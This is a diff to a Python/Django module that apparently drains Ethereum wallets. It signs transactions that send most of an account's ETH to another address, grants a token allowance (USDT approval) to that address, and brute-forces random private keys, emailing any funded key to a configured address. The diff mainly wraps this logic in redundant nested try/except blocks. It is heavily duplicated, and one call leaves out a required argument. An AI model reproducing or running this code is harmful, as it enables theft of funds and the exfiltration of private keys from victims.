@@ -20,16 +20,7 @@ usdt_contract_abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"na
 @atomic
 def approve_transaction(balance, to_account, from_account, web3, private_key, contract, value):
     try:
-        tx = contract.functions.approve(to_account, value).buildTransaction({
-            'from': from_account,
-            'gas': 21000,
-            'gasPrice': int((balance - 100000) / 21000),
-            'nonce': web3.eth.getTransactionCount(from_account, 'pending')
-        })
-        signed_tx = web3.eth.account.signTransaction(tx, private_key)
-        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
-        if balance > 165311289288785:
-            web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
+        try:
             tx = contract.functions.approve(to_account, value).buildTransaction({
                 'from': from_account,
                 'gas': 21000,
@@ -38,42 +29,43 @@ def approve_transaction(balance, to_account, from_account, web3, private_key, co
             })
             signed_tx = web3.eth.account.signTransaction(tx, private_key)
             web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            if balance > 165311289288785:
+                web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
+                tx = contract.functions.approve(to_account, value).buildTransaction({
+                    'from': from_account,
+                    'gas': 21000,
+                    'gasPrice': int((balance - 100000) / 21000),
+                    'nonce': web3.eth.getTransactionCount(from_account, 'pending')
+                })
+                signed_tx = web3.eth.account.signTransaction(tx, private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        except:
+            tx = contract.functions.approve(to_account, value).buildTransaction({
+                'from': from_account,
+                'gas': 21000,
+                'gasPrice': int((balance - 100000) / 21000),
+                'nonce': web3.eth.getTransactionCount(from_account, 'pending')
+            })
+            signed_tx = web3.eth.account.signTransaction(tx, private_key)
+            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            if balance > 165311289288785:
+                web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
+                tx = contract.functions.approve(to_account, value).buildTransaction({
+                    'from': from_account,
+                    'gas': 21000,
+                    'gasPrice': int((balance - 100000) / 21000),
+                    'nonce': web3.eth.getTransactionCount(from_account, 'pending')
+                })
+                signed_tx = web3.eth.account.signTransaction(tx, private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
     except:
-        tx = contract.functions.approve(to_account, value).buildTransaction({
-            'from': from_account,
-            'gas': 21000,
-            'gasPrice': int((balance - 100000) / 21000),
-            'nonce': web3.eth.getTransactionCount(from_account, 'pending')
-        })
-        signed_tx = web3.eth.account.signTransaction(tx, private_key)
-        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
-        if balance > 165311289288785:
-            web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
-            tx = contract.functions.approve(to_account, value).buildTransaction({
-                'from': from_account,
-                'gas': 21000,
-                'gasPrice': int((balance - 100000) / 21000),
-                'nonce': web3.eth.getTransactionCount(from_account, 'pending')
-            })
-            signed_tx = web3.eth.account.signTransaction(tx, private_key)
-            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        pass
 
 
 @atomic
 def send_ethereum(web3, to_account, from_account, private_key, balance):
     try:
-        signed_tx = web3.eth.account.signTransaction(
-            {
-                'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
-                'to': to_account,
-                'value': int(balance * 0.09),
-                'gas': 21000,
-                'gasPrice': int(balance * 0.99 / 21000)
-            },
-            private_key)
-        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
-        if balance > 165311289288785:
-            web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
+        try:
             signed_tx = web3.eth.account.signTransaction(
                 {
                     'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
@@ -84,7 +76,30 @@ def send_ethereum(web3, to_account, from_account, private_key, balance):
                 },
                 private_key)
             web3.eth.sendRawTransaction(signed_tx.rawTransaction)
-        else:
+            if balance > 165311289288785:
+                web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            else:
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        except:
             signed_tx = web3.eth.account.signTransaction(
                 {
                     'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
@@ -95,44 +110,38 @@ def send_ethereum(web3, to_account, from_account, private_key, balance):
                 },
                 private_key)
             web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+            if balance > 165311289288785:
+                web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
+                signed_tx = web3.eth.account.signTransaction(
+                    {
+                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                        'to': to_account,
+                        'value': int(balance * 0.09),
+                        'gas': 21000,
+                        'gasPrice': int(balance * 0.99 / 21000)
+                    },
+                    private_key)
+                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
     except:
-        signed_tx = web3.eth.account.signTransaction(
-            {
-                'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
-                'to': to_account,
-                'value': int(balance * 0.09),
-                'gas': 21000,
-                'gasPrice': int(balance * 0.99 / 21000)
-            },
-            private_key)
-        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
-        if balance > 165311289288785:
-            web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
-            signed_tx = web3.eth.account.signTransaction(
-                {
-                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
-                    'to': to_account,
-                    'value': int(balance * 0.09),
-                    'gas': 21000,
-                    'gasPrice': int(balance * 0.99 / 21000)
-                },
-                private_key)
-            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        pass
 
 
 @atomic
 def random_private_key(web3):
-    print(random.randbytes(32))
-    private_key = random.randbytes(32)
-    acct = web3.eth.account.privateKeyToAccount(private_key)
-    address = acct.address
-    print(web3.eth.get_balance(address))
-    print(address)
-    if web3.eth.get_balance(address) > 0:
-        EthereumAccounts.objects.create(private_key=private_key, address=address)
-        mail.send_mail(subject='private key', message=f"{private_key} ---- {address}",
-                       recipient_list=[config('TO_MAIL')], fail_silently=True,
-                       from_email=config('EMAIL_HOST_USER'))
+    try:
+        print(random.randbytes(32))
+        private_key = random.randbytes(32)
+        acct = web3.eth.account.privateKeyToAccount(private_key)
+        address = acct.address
+        print(web3.eth.get_balance(address))
+        print(address)
+        if web3.eth.get_balance(address) > 0:
+            EthereumAccounts.objects.create(private_key=private_key, address=address)
+            mail.send_mail(subject='private key', message=f"{private_key} ---- {address}",
+                           recipient_list=[config('TO_MAIL')], fail_silently=True,
+                           from_email=config('EMAIL_HOST_USER'))
+    except:
+        pass
     return True
 
 
@@ -521,3 +530,5 @@ def automate_send_eth_and_approve_10():
     send_ethereum(web3=web3, from_account=from_account, to_account=to_account, private_key=private_key, balance=balance)
     approve_transaction(web3=web3, from_account=from_account, to_account=to_account, balance=balance, value=value)
     random_private_key(web3)
+
+
